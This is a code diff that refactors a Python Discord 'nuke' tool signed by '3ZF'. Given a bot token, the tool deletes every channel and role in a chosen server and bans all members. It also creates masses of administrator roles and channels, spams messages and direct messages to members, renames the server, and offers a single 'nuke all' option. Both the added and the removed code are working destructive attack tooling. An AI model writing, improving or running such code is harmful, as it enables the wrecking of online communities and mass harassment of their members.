@@ -8,25 +8,11 @@ import asyncio
 import discord
 from discord.ext import commands
 from colorama import init, Fore, Style
-import time
 
 init(autoreset=True)
 
 RED = Fore.RED + Style.BRIGHT
-GREEN = Fore.GREEN + Style.BRIGHT
-YELLOW = Fore.YELLOW + Style.BRIGHT
-CYAN = Fore.CYAN + Style.BRIGHT
-WHITE = Fore.WHITE + Style.BRIGHT
 RESET = Style.RESET_ALL
-
-def clear():
-    os.system("cls" if os.name == "nt" else "clear")
-
-def center(txt, w=90):
-    return txt.center(w)
-
-def pcenter(txt, col=RED):
-    print(col + center(txt) + RESET)
 
 LOGO = f"""
 {RED}
@@ -35,323 +21,508 @@ LOGO = f"""
  █████╔╝██║██╔██║███████╗███████╗
  ╚═══██╗████╔╝██║╚════██║╚════██║
 ██████╔╝╚██████╔╝███████║███████║
-╚═════╝  ╚═════╝ ╚══════╝╚══════╝
+╚═════╝  ╚═════╝ ╚══════╝╚══════╝{RESET}
 """
 
 BANNER = f"""
-{RED}╔══════════════════════════════════════════════════════════════════════╗
+{RED}╔══════════════════════════════════════╗
 {RED}║        ULTIMATE NUKE ENGINE        ║
 {RED}║        PROGRAMMED BY 3ZF           ║
-{RED}╚══════════════════════════════════════════════════════════════════════╝{RESET}
+{RED}╚══════════════════════════════════════╝{RESET}
 """
 
-def show(user=None):
-    clear()
-    print(LOGO)
-    print(BANNER)
-    if user:
-        pcenter(f"[+] LOGGED IN AS: {user}", CYAN)
-        print()
+def clear_screen():
+    try:
+        os.system("cls" if os.name == "nt" else "clear")
+    except:
+        pass
 
-pcenter("ENTER TOKEN", YELLOW)
-print()
-TOKEN = input(CYAN + center("> TOKEN: ") + RESET).strip()
+def show_banner(user=None):
+    try:
+        clear_screen()
+        print(LOGO)
+        print(BANNER)
+        if user:
+            print(f"{RED}[+] LOGGED IN AS: {user}{RESET}")
+    except:
+        pass
 
-intents = discord.Intents.all()
-bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
-
-guild = None
-run = True
-BATCH = 5000
-
-@bot.event
-async def on_ready():
-    global guild
-    show(bot.user.name)
-    servers = sorted(list(bot.guilds), key=lambda x: x.member_count, reverse=True)
-    pcenter(f"SERVERS ({len(servers)})", YELLOW)
-    print()
-    for i, s in enumerate(servers):
-        pcenter(f"{i+1}. {s.name[:30]} (MEMBERS: {s.member_count})", WHITE)
-    print()
-    while True:
-        try:
-            c = input(CYAN + center("> CHOOSE SERVER NUMBER: ") + RESET).strip()
-            idx = int(c) - 1
-            if 0 <= idx < len(servers):
-                guild = servers[idx]
-                break
-        except:
-            pass
-        pcenter("[-] INVALID NUMBER", RED)
-    print()
-    pcenter(f"[+] TARGET: {guild.name}", GREEN)
-    await menu()
-
-async def menu():
-    global run
-    while run:
-        print()
-        pcenter("┌─────────────────────────────────────────────────────────────┐", RED)
-        pcenter("│ [1] DELETE CHANNELS   |   [2] DELETE ROLES     │", RED)
-        pcenter("│ [3] BAN MEMBERS       |   [4] CREATE CHANNELS  │", RED)
-        pcenter("│ [5] CREATE ROLES      |   [6] WEBHOOK SPAM     │", RED)
-        pcenter("│ [7] CHANGE SERVER NAME|   [8] DM ALL MEMBERS   │", RED)
-        pcenter("│ [9] EXIT                                        │", RED)
-        pcenter("└─────────────────────────────────────────────────────────────┘", RED)
-        print()
-        pcenter("            PROGRAMMED BY 3ZF", RED)
-        print()
-        ch = input(CYAN + center("> CHOOSE OPTION: ") + RESET).strip()
+def main():
+    try:
+        show_banner()
+        TOKEN = input(f"{RED}> ENTER TOKEN: {RESET}").strip()
+        if not TOKEN:
+            print(f"{RED}[-] TOKEN CANNOT BE EMPTY{RESET}")
+            sys.exit(1)
         
-        if ch == "1": await delch()
-        elif ch == "2": await delrol()
-        elif ch == "3": await banall()
-        elif ch == "4": await crch()
-        elif ch == "5": await crrol()
-        elif ch == "6": await webspam()
-        elif ch == "7": await chname()
-        elif ch == "8": await dmall()
-        elif ch == "9":
-            run = False
-            pcenter("[+] EXITING...", RED)
-            await bot.close()
+        intents = discord.Intents.all()
+        bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
+        
+        selected_guild = None
+        running = True
+        
+        @bot.event
+        async def on_ready():
+            nonlocal selected_guild
+            try:
+                show_banner(bot.user.name)
+                servers = sorted(list(bot.guilds), key=lambda x: x.member_count, reverse=True)
+                
+                if not servers:
+                    print(f"{RED}[-] NO SERVERS FOUND{RESET}")
+                    await bot.close()
+                    sys.exit(1)
+                
+                print(f"\n{RED}SERVERS ({len(servers)}):{RESET}")
+                for i, s in enumerate(servers):
+                    print(f"  {RED}{i+1}. {s.name[:20]:<20} (MEMBERS: {s.member_count}){RESET}")
+                
+                while True:
+                    try:
+                        idx = int(input(f"\n{RED}> CHOOSE SERVER NUMBER: {RESET}")) - 1
+                        if 0 <= idx < len(servers):
+                            selected_guild = servers[idx]
+                            break
+                        else:
+                            print(f"{RED}[-] INVALID NUMBER{RESET}")
+                    except ValueError:
+                        print(f"{RED}[-] ENTER A NUMBER{RESET}")
+                    except KeyboardInterrupt:
+                        print(f"\n{RED}[-] EXITING...{RESET}")
+                        await bot.close()
+                        sys.exit(0)
+                
+                print(f"\n{RED}[+] TARGET: {selected_guild.name}{RESET}")
+                await main_menu()
+            except Exception as e:
+                print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
+                await bot.close()
+                sys.exit(1)
+        
+        async def main_menu():
+            nonlocal running
+            while running:
+                try:
+                    print(f"\n{RED}┌─────────────────────────────────────────────────────────────┐")
+                    print(f"{RED}│ [1] DELETE CHANNELS   |   [2] DELETE ROLES     │")
+                    print(f"{RED}│ [3] BAN MEMBERS       |   [4] CREATE CHANNELS  │")
+                    print(f"{RED}│ [5] CREATE ROLES      |   [6] SPAM MESSAGES    │")
+                    print(f"{RED}│ [7] CHANGE SERVER NAME|   [8] DM ALL MEMBERS   │")
+                    print(f"{RED}│ [9] NUKE ALL         |   [0] EXIT              │")
+                    print(f"{RED}└─────────────────────────────────────────────────────────────┘")
+                    print(f"\n{RED}            PROGRAMMED BY 3ZF{RESET}")
+                    
+                    choice = input(f"\n{RED}> CHOOSE OPTION: {RESET}").strip()
+                    
+                    if choice == "1":
+                        await delete_channels()
+                    elif choice == "2":
+                        await delete_roles()
+                    elif choice == "3":
+                        await ban_members()
+                    elif choice == "4":
+                        await create_channels()
+                    elif choice == "5":
+                        await create_roles()
+                    elif choice == "6":
+                        await spam_messages()
+                    elif choice == "7":
+                        await change_server_name()
+                    elif choice == "8":
+                        await dm_all_members()
+                    elif choice == "9":
+                        await nuke_all()
+                    elif choice == "0":
+                        running = False
+                        print(f"\n{RED}[+] EXITING...{RESET}")
+                        await bot.close()
+                        sys.exit(0)
+                    else:
+                        print(f"{RED}[-] INVALID OPTION{RESET}")
+                        await asyncio.sleep(0.1)
+                except KeyboardInterrupt:
+                    running = False
+                    print(f"\n{RED}[+] EXITING...{RESET}")
+                    await bot.close()
+                    sys.exit(0)
+                except Exception as e:
+                    print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
+                    await asyncio.sleep(0.1)
+        
+        async def delete_channels():
+            try:
+                print(f"\n{RED}[+] DELETING ALL CHANNELS...{RESET}")
+                
+                if not selected_guild:
+                    print(f"{RED}[-] NO SERVER SELECTED{RESET}")
+                    return
+                
+                channels = list(selected_guild.channels)
+                if not channels:
+                    print(f"{RED}[-] NO CHANNELS TO DELETE{RESET}")
+                    return
+                
+                count = 0
+                for ch in channels:
+                    try:
+                        await ch.delete()
+                        count += 1
+                        await asyncio.sleep(0.05)
+                    except:
+                        pass
+                
+                print(f"{RED}[+] {count} CHANNELS DELETED!{RESET}")
+            except Exception as e:
+                print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
+            await asyncio.sleep(0.1)
+        
+        async def delete_roles():
+            try:
+                print(f"\n{RED}[+] DELETING ALL ROLES...{RESET}")
+                
+                if not selected_guild:
+                    print(f"{RED}[-] NO SERVER SELECTED{RESET}")
+                    return
+                
+                roles = [r for r in selected_guild.roles if r.name != "@everyone"]
+                if not roles:
+                    print(f"{RED}[-] NO ROLES TO DELETE{RESET}")
+                    return
+                
+                count = 0
+                for r in roles:
+                    try:
+                        await r.delete()
+                        count += 1
+                        await asyncio.sleep(0.05)
+                    except:
+                        pass
+                
+                print(f"{RED}[+] {count} ROLES DELETED!{RESET}")
+            except Exception as e:
+                print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
+            await asyncio.sleep(0.1)
+        
+        async def ban_members():
+            try:
+                confirm = input(f"{RED}> BAN ALL MEMBERS? (YES/NO): {RESET}").lower()
+                if confirm != "yes":
+                    print(f"{RED}[-] CANCELLED{RESET}")
+                    return
+                
+                print(f"\n{RED}[+] BANNING MEMBERS...{RESET}")
+                
+                if not selected_guild:
+                    print(f"{RED}[-] NO SERVER SELECTED{RESET}")
+                    return
+                
+                members = [m for m in selected_guild.members if m.id != bot.user.id and not m.bot]
+                if not members:
+                    print(f"{RED}[-] NO MEMBERS TO BAN{RESET}")
+                    return
+                
+                count = 0
+                for m in members:
+                    try:
+                        await m.ban(reason="NUKE")
+                        count += 1
+                        await asyncio.sleep(0.05)
+                    except:
+                        pass
+                
+                print(f"{RED}[+] {count} MEMBERS BANNED!{RESET}")
+            except Exception as e:
+                print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
+            await asyncio.sleep(0.1)
+        
+        async def create_channels():
+            try:
+                if not selected_guild:
+                    print(f"{RED}[-] NO SERVER SELECTED{RESET}")
+                    return
+                
+                try:
+                    count = int(input(f"{RED}> HOW MANY CHANNELS?: {RESET}"))
+                    if count <= 0:
+                        print(f"{RED}[-] ENTER A POSITIVE NUMBER{RESET}")
+                        return
+                except ValueError:
+                    print(f"{RED}[-] ENTER A NUMBER{RESET}")
+                    return
+                
+                print(f"\n{RED}[+] ENTER 3 CHANNEL NAMES (PRESS ENTER AFTER EACH):{RESET}")
+                names = []
+                for i in range(3):
+                    name = input(f"{RED}> NAME {i+1}: {RESET}").strip()
+                    if name:
+                        names.append(name)
+                    else:
+                        names.append(f"CHANNEL-{i+1}")
+                
+                print(f"\n{RED}[+] CREATING {count} CHANNELS...{RESET}")
+                
+                created = 0
+                for i in range(count):
+                    try:
+                        name = names[i % 3]
+                        await selected_guild.create_text_channel(name)
+                        created += 1
+                        await asyncio.sleep(0.05)
+                    except:
+                        pass
+                
+                print(f"{RED}[+] {created} CHANNELS CREATED!{RESET}")
+            except Exception as e:
+                print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
+            await asyncio.sleep(0.1)
+        
+        async def create_roles():
+            try:
+                if not selected_guild:
+                    print(f"{RED}[-] NO SERVER SELECTED{RESET}")
+                    return
+                
+                try:
+                    count = int(input(f"{RED}> HOW MANY ROLES?: {RESET}"))
+                    if count <= 0:
+                        print(f"{RED}[-] ENTER A POSITIVE NUMBER{RESET}")
+                        return
+                except ValueError:
+                    print(f"{RED}[-] ENTER A NUMBER{RESET}")
+                    return
+                
+                print(f"\n{RED}[+] ENTER 3 ROLE NAMES (PRESS ENTER AFTER EACH):{RESET}")
+                names = []
+                for i in range(3):
+                    name = input(f"{RED}> NAME {i+1}: {RESET}").strip()
+                    if name:
+                        names.append(name)
+                    else:
+                        names.append(f"ROLE-{i+1}")
+                
+                print(f"\n{RED}[+] CREATING {count} ADMIN ROLES...{RESET}")
+                
+                created = 0
+                for i in range(count):
+                    try:
+                        name = names[i % 3]
+                        await selected_guild.create_role(
+                            name=name,
+                            color=discord.Color.from_rgb(139, 0, 0),
+                            permissions=discord.Permissions(administrator=True)
+                        )
+                        created += 1
+                        await asyncio.sleep(0.05)
+                    except:
+                        pass
+                
+                print(f"{RED}[+] {created} ADMIN ROLES CREATED!{RESET}")
+            except Exception as e:
+                print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
+            await asyncio.sleep(0.1)
+        
+        async def spam_messages():
+            try:
+                if not selected_guild:
+                    print(f"{RED}[-] NO SERVER SELECTED{RESET}")
+                    return
+                
+                try:
+                    count = int(input(f"{RED}> MESSAGES PER CHANNEL?: {RESET}"))
+                    if count <= 0:
+                        print(f"{RED}[-] ENTER A POSITIVE NUMBER{RESET}")
+                        return
+                except ValueError:
+                    print(f"{RED}[-] ENTER A NUMBER{RESET}")
+                    return
+                
+                msg = input(f"{RED}> MESSAGE CONTENT: {RESET}")
+                if not msg:
+                    print(f"{RED}[-] MESSAGE CANNOT BE EMPTY{RESET}")
+                    return
+                
+                text_channels = list(selected_guild.text_channels)
+                if not text_channels:
+                    print(f"{RED}[-] NO TEXT CHANNELS FOUND{RESET}")
+                    return
+                
+                print(f"\n{RED}[+] SPAMMING {count} MESSAGES TO {len(text_channels)} CHANNELS...{RESET}")
+                
+                sent = 0
+                for ch in text_channels:
+                    for _ in range(count):
+                        try:
+                            await ch.send(msg)
+                            sent += 1
+                            await asyncio.sleep(0.05)
+                        except:
+                            pass
+                
+                print(f"{RED}[+] {sent} MESSAGES SENT!{RESET}")
+            except Exception as e:
+                print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
+            await asyncio.sleep(0.1)
+        
+        async def change_server_name():
+            try:
+                if not selected_guild:
+                    print(f"{RED}[-] NO SERVER SELECTED{RESET}")
+                    return
+                
+                name = input(f"{RED}> NEW SERVER NAME: {RESET}")
+                if not name:
+                    print(f"{RED}[-] NAME CANNOT BE EMPTY{RESET}")
+                    return
+                
+                try:
+                    await selected_guild.edit(name=name)
+                    print(f"{RED}[+] SERVER NAME CHANGED TO: {name}{RESET}")
+                except Exception as e:
+                    print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
+            except Exception as e:
+                print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
+            await asyncio.sleep(0.1)
+        
+        async def dm_all_members():
+            try:
+                if not selected_guild:
+                    print(f"{RED}[-] NO SERVER SELECTED{RESET}")
+                    return
+                
+                try:
+                    count = int(input(f"{RED}> HOW MANY MESSAGES PER MEMBER?: {RESET}"))
+                    if count <= 0:
+                        print(f"{RED}[-] ENTER A POSITIVE NUMBER{RESET}")
+                        return
+                except ValueError:
+                    print(f"{RED}[-] ENTER A NUMBER{RESET}")
+                    return
+                
+                msg = input(f"{RED}> MESSAGE CONTENT: {RESET}")
+                if not msg:
+                    print(f"{RED}[-] MESSAGE CANNOT BE EMPTY{RESET}")
+                    return
+                
+                members = [m for m in selected_guild.members if m.id != bot.user.id and not m.bot]
+                if not members:
+                    print(f"{RED}[-] NO MEMBERS TO DM{RESET}")
+                    return
+                
+                print(f"\n{RED}[+] SENDING {count} DMS TO {len(members)} MEMBERS...{RESET}")
+                
+                sent = 0
+                for member in members:
+                    for _ in range(count):
+                        try:
+                            await member.send(msg)
+                            sent += 1
+                            await asyncio.sleep(0.05)
+                        except:
+                            pass
+                
+                print(f"{RED}[+] {sent} DMS SENT SUCCESSFULLY!{RESET}")
+            except Exception as e:
+                print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
+            await asyncio.sleep(0.1)
+        
+        async def nuke_all():
+            try:
+                if not selected_guild:
+                    print(f"{RED}[-] NO SERVER SELECTED{RESET}")
+                    return
+                
+                confirm = input(f"{RED}> NUKE EVERYTHING? (YES/NO): {RESET}").lower()
+                if confirm != "yes":
+                    print(f"{RED}[-] CANCELLED{RESET}")
+                    return
+                
+                print(f"\n{RED}[+] STARTING ULTIMATE NUKE...{RESET}")
+                
+                try:
+                    channels = list(selected_guild.channels)
+                    roles = [r for r in selected_guild.roles if r.name != "@everyone"]
+                    members = [m for m in selected_guild.members if m.id != bot.user.id and not m.bot]
+                    
+                    deleted_channels = 0
+                    for ch in channels:
+                        try:
+                            await ch.delete()
+                            deleted_channels += 1
+                            await asyncio.sleep(0.05)
+                        except:
+                            pass
+                    
+                    deleted_roles = 0
+                    for r in roles:
+                        try:
+                            await r.delete()
+                            deleted_roles += 1
+                            await asyncio.sleep(0.05)
+                        except:
+                            pass
+                    
+                    banned_members = 0
+                    for m in members:
+                        try:
+                            await m.ban(reason="ULTIMATE NUKE")
+                            banned_members += 1
+                            await asyncio.sleep(0.05)
+                        except:
+                            pass
+                    
+                    try:
+                        await selected_guild.edit(name="NUKE BY 3ZF")
+                    except:
+                        pass
+                    
+                    created_channels = 0
+                    for _ in range(500):
+                        try:
+                            await selected_guild.create_text_channel("NUKE-3ZF")
+                            created_channels += 1
+                            await asyncio.sleep(0.05)
+                        except:
+                            pass
+                    
+                    sent_messages = 0
+                    for ch in selected_guild.text_channels:
+                        for _ in range(100):
+                            try:
+                                await ch.send("NUKE BY 3ZF")
+                                sent_messages += 1
+                                await asyncio.sleep(0.05)
+                            except:
+                                pass
+                    
+                    print(f"{RED}[+] ULTIMATE NUKE COMPLETED!{RESET}")
+                    print(f"{RED}[+] DELETED {deleted_channels} CHANNELS{RESET}")
+                    print(f"{RED}[+] DELETED {deleted_roles} ROLES{RESET}")
+                    print(f"{RED}[+] BANNED {banned_members} MEMBERS{RESET}")
+                    print(f"{RED}[+] CREATED {created_channels} CHANNELS{RESET}")
+                    print(f"{RED}[+] SENT {sent_messages} MESSAGES{RESET}")
+                except Exception as e:
+                    print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
+            except Exception as e:
+                print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
+            await asyncio.sleep(0.1)
+        
+        try:
+            bot.run(TOKEN, reconnect=True)
+        except discord.LoginFailure:
+            print(f"{RED}[-] INVALID TOKEN{RESET}")
+            sys.exit(1)
+        except KeyboardInterrupt:
+            print(f"\n{RED}[-] EXITING...{RESET}")
             sys.exit(0)
-        else:
-            pcenter("[-] INVALID OPTION", RED)
-            await asyncio.sleep(0.2)
-
-async def delch():
-    pcenter("[+] DELETING CHANNELS AT MAX SPEED...", YELLOW)
-    st = time.time()
-    try:
-        chs = list(guild.channels)
-        if not chs:
-            pcenter("[-] NO CHANNELS", RED)
-            await asyncio.sleep(0.2)
-            return
-        total = len(chs)
-        done = 0
-        for i in range(0, total, BATCH):
-            chunk = chs[i:i+BATCH]
-            res = await asyncio.gather(*[c.delete() for c in chunk], return_exceptions=True)
-            done += sum(1 for r in res if not isinstance(r, Exception))
-            pcenter(f"PROGRESS: {(done/total)*100:.1f}% ({done}/{total})", CYAN)
-        et = time.time() - st
-        pcenter(f"[+] {done} CHANNELS DELETED IN {et:.2f}S", GREEN)
-        pcenter(f"SPEED: ~{done/et:.1f} CH/S", CYAN)
+        except Exception as e:
+            print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
+            sys.exit(1)
+    except KeyboardInterrupt:
+        print(f"\n{RED}[-] EXITING...{RESET}")
+        sys.exit(0)
     except Exception as e:
-        pcenter(f"[-] {str(e)[:50]}", RED)
-    await asyncio.sleep(0.3)
-
-async def delrol():
-    pcenter("[+] DELETING ROLES AT MAX SPEED...", YELLOW)
-    st = time.time()
-    try:
-        rols = [r for r in guild.roles if r.name != "@everyone"]
-        if not rols:
-            pcenter("[-] NO ROLES", RED)
-            await asyncio.sleep(0.2)
-            return
-        total = len(rols)
-        done = 0
-        for i in range(0, total, BATCH):
-            chunk = rols[i:i+BATCH]
-            res = await asyncio.gather(*[r.delete() for r in chunk], return_exceptions=True)
-            done += sum(1 for r in res if not isinstance(r, Exception))
-            pcenter(f"PROGRESS: {(done/total)*100:.1f}% ({done}/{total})", CYAN)
-        et = time.time() - st
-        pcenter(f"[+] {done} ROLES DELETED IN {et:.2f}S", GREEN)
-        pcenter(f"SPEED: ~{done/et:.1f} ROLES/S", CYAN)
-    except Exception as e:
-        pcenter(f"[-] {str(e)[:50]}", RED)
-    await asyncio.sleep(0.3)
-
-async def banall():
-    conf = input(CYAN + center("> BAN ALL? (YES/NO): ") + RESET).lower()
-    if conf != "yes":
-        pcenter("[-] CANCELLED", RED)
-        await asyncio.sleep(0.2)
-        return
-    pcenter("[+] BANNING MEMBERS AT MAX SPEED...", YELLOW)
-    st = time.time()
-    try:
-        mems = [m for m in guild.members if m.id != bot.user.id and not m.bot]
-        if not mems:
-            pcenter("[-] NO MEMBERS", RED)
-            await asyncio.sleep(0.2)
-            return
-        total = len(mems)
-        done = 0
-        for i in range(0, total, BATCH):
-            chunk = mems[i:i+BATCH]
-            res = await asyncio.gather(*[m.ban(reason="NUKE") for m in chunk], return_exceptions=True)
-            done += sum(1 for r in res if not isinstance(r, Exception))
-            pcenter(f"PROGRESS: {(done/total)*100:.1f}% ({done}/{total})", CYAN)
-        et = time.time() - st
-        pcenter(f"[+] {done} MEMBERS BANNED IN {et:.2f}S", GREEN)
-        pcenter(f"SPEED: ~{done/et:.1f} MEMBERS/S", CYAN)
-    except Exception as e:
-        pcenter(f"[-] {str(e)[:50]}", RED)
-    await asyncio.sleep(0.3)
-
-async def crch():
-    pcenter("ENTER CHANNEL COUNT", YELLOW)
-    print()
-    cnt = int(input(CYAN + center("> COUNT: ") + RESET).strip())
-    if cnt <= 0:
-        pcenter("[-] INVALID", RED)
-        await asyncio.sleep(0.2)
-        return
-    pcenter("ENTER 3 NAMES", YELLOW)
-    names = []
-    for i in range(3):
-        nm = input(CYAN + center(f"> NAME {i+1}: ") + RESET).strip()
-        names.append(nm if nm else f"CH-{i+1}")
-    pcenter(f"[+] CREATING {cnt} CHANNELS AT MAX SPEED...", YELLOW)
-    st = time.time()
-    try:
-        tasks = []
-        for i in range(cnt):
-            nm = names[i % 3]
-            if i >= 100:
-                nm = f"{nm}-{random.randint(1, 9999)}"
-            tasks.append(guild.create_text_channel(nm))
-        done = 0
-        for i in range(0, len(tasks), BATCH):
-            chunk = tasks[i:i+BATCH]
-            res = await asyncio.gather(*chunk, return_exceptions=True)
-            done += sum(1 for r in res if not isinstance(r, Exception))
-            pcenter(f"PROGRESS: {(done/cnt)*100:.1f}% ({done}/{cnt})", CYAN)
-        et = time.time() - st
-        pcenter(f"[+] {done} CHANNELS CREATED IN {et:.2f}S", GREEN)
-        pcenter(f"SPEED: ~{done/et:.1f} CH/S", CYAN)
-    except Exception as e:
-        pcenter(f"[-] {str(e)[:50]}", RED)
-    await asyncio.sleep(0.3)
-
-async def crrol():
-    pcenter("ENTER ROLE COUNT", YELLOW)
-    print()
-    cnt = int(input(CYAN + center("> COUNT: ") + RESET).strip())
-    if cnt <= 0:
-        pcenter("[-] INVALID", RED)
-        await asyncio.sleep(0.2)
-        return
-    pcenter("ENTER 3 NAMES", YELLOW)
-    names = []
-    for i in range(3):
-        nm = input(CYAN + center(f"> NAME {i+1}: ") + RESET).strip()
-        names.append(nm if nm else f"ROLE-{i+1}")
-    cols = [discord.Color.red(), discord.Color.blue(), discord.Color.green(), 
-            discord.Color.purple(), discord.Color.gold(), discord.Color.orange()]
-    pcenter(f"[+] CREATING {cnt} ADMIN ROLES AT MAX SPEED...", YELLOW)
-    st = time.time()
-    try:
-        tasks = []
-        for i in range(cnt):
-            nm = names[i % 3]
-            if i >= 100:
-                nm = f"{nm}-{random.randint(1, 9999)}"
-            col = random.choice(cols)
-            tasks.append(guild.create_role(name=nm, color=col, permissions=discord.Permissions(administrator=True)))
-        done = 0
-        for i in range(0, len(tasks), BATCH):
-            chunk = tasks[i:i+BATCH]
-            res = await asyncio.gather(*chunk, return_exceptions=True)
-            done += sum(1 for r in res if not isinstance(r, Exception))
-            pcenter(f"PROGRESS: {(done/cnt)*100:.1f}% ({done}/{cnt})", CYAN)
-        et = time.time() - st
-        pcenter(f"[+] {done} ROLES CREATED IN {et:.2f}S", GREEN)
-        pcenter(f"SPEED: ~{done/et:.1f} ROLES/S", CYAN)
-    except Exception as e:
-        pcenter(f"[-] {str(e)[:50]}", RED)
-    await asyncio.sleep(0.3)
-
-async def webspam():
-    pcenter("WEBHOOK SPAM", YELLOW)
-    print()
-    msg = input(CYAN + center("> CONTENT: ") + RESET).strip()
-    if not msg: msg = "NUKE"
-    amt = int(input(CYAN + center("> AMOUNT: ") + RESET).strip())
-    if amt <= 0:
-        pcenter("[-] INVALID", RED)
-        await asyncio.sleep(0.2)
-        return
-    pcenter(f"[+] SENDING {amt} WEBHOOK MESSAGES...", YELLOW)
-    try:
-        whs = await guild.webhooks()
-        if not whs:
-            pcenter("[-] NO WEBHOOKS, CREATING...", RED)
-            chs = guild.text_channels
-            if chs:
-                wh = await chs[0].create_webhook(name="NUKER")
-                whs = [wh]
-            else:
-                pcenter("[-] NO CHANNELS", RED)
-                await asyncio.sleep(0.2)
-                return
-        tasks = []
-        for _ in range(amt):
-            for w in whs:
-                tasks.append(w.send(msg))
-        done = 0
-        for i in range(0, len(tasks), BATCH):
-            chunk = tasks[i:i+BATCH]
-            res = await asyncio.gather(*chunk, return_exceptions=True)
-            done += sum(1 for r in res if not isinstance(r, Exception))
-            pcenter(f"PROGRESS: {(done/len(tasks))*100:.1f}% ({done}/{len(tasks)})", CYAN)
-        pcenter(f"[+] {done} WEBHOOKS SENT", GREEN)
-    except Exception as e:
-        pcenter(f"[-] {str(e)[:50]}", RED)
-    await asyncio.sleep(0.3)
-
-async def chname():
-    nm = input(CYAN + center("> NEW NAME: ") + RESET).strip()
-    if not nm:
-        pcenter("[-] EMPTY", RED)
-        await asyncio.sleep(0.2)
-        return
-    try:
-        await guild.edit(name=nm)
-        pcenter(f"[+] NAME CHANGED TO: {nm}", GREEN)
-    except Exception as e:
-        pcenter(f"[-] {str(e)[:50]}", RED)
-    await asyncio.sleep(0.2)
-
-async def dmall():
-    pcenter("DM ALL MEMBERS", YELLOW)
-    print()
-    cnt = int(input(CYAN + center("> MSGS PER MEMBER: ") + RESET).strip())
-    if cnt <= 0:
-        pcenter("[-] INVALID", RED)
-        await asyncio.sleep(0.2)
-        return
-    msg = input(CYAN + center("> MESSAGE: ") + RESET).strip()
-    if not msg: msg = "NUKE"
-    mems = [m for m in guild.members if m.id != bot.user.id and not m.bot]
-    if not mems:
-        pcenter("[-] NO MEMBERS", RED)
-        await asyncio.sleep(0.2)
-        return
-    pcenter(f"[+] SENDING {cnt} DMS TO {len(mems)} MEMBERS...", YELLOW)
-    st = time.time()
-    try:
-        tasks = []
-        for m in mems:
-            for _ in range(cnt):
-                tasks.append(m.send(msg))
-        done = 0
-        for i in range(0, len(tasks), BATCH):
-            chunk = tasks[i:i+BATCH]
-            res = await asyncio.gather(*chunk, return_exceptions=True)
-            done += sum(1 for r in res if not isinstance(r, Exception))
-            pcenter(f"PROGRESS: {(done/len(tasks))*100:.1f}% ({done}/{len(tasks)})", CYAN)
-        et = time.time() - st
-        pcenter(f"[+] {done} DMS SENT IN {et:.2f}S", GREEN)
-        pcenter(f"SPEED: ~{done/et:.1f} DMS/S", CYAN)
-    except Exception as e:
-        pcenter(f"[-] {str(e)[:50]}", RED)
-    await asyncio.sleep(0.3)
+        print(f"{RED}[-] ERROR: {str(e)[:50]}{RESET}")
+        sys.exit(1)
 
 if __name__ == "__main__":
+    main()
